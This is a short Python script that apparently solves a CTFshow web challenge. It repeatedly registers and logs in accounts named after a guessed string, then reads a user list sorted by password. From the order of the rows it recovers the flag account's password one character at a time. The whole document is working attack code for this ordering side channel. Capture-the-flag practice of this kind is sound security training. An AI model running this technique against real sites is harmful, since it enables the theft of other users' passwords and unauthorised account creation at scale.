import time
import requests

############ CTFshow web1
def ctfshow_web_1():
    url = "http://89c66621-11ae-44e8-b3db-50854912a6bd.challenge.ctf.show"
    url1= url + "/reg.php" #注册页面
    url2= url + "/login.php"#登录界面
    url3= url + "/user_main.php?order=pwd" #查询界面
    currentStr=""
    key = 0
    s = "-.0123456789:abcdefghijklmnopqrstuvwxyz{}|~"
    for j in range(0,45):
        if (key == 1):
            break;
        print("*")
        for i in s:
            l = ""
            l = currentStr + i
            l2 = currentStr + chr(ord(i)-1)
            data = {'username':l,
                    'email':'c',
                    'nickname':'c',
                    'password':l
                    }
            data2 = {'username':l,
                      'password':l
                    }
            if (l=='flag'):
                currentStr='flag'
                print(currentStr)
                break
            session = requests.session()
            r1 = session.post(url1,data)
            time.sleep(0.1)
            r2 = session.post(url2,data)
            time.sleep(0.1)
            r3 = session.get(url3)
            t = r3.text
            if (t.index("<td>"+l+"</td>")>t.index("<td>flag@ctf.show</td>")):
                currentStr=l2
                print(currentStr)
                if(i=="~"):
                    key=1
                break
ctfshow_web_1()
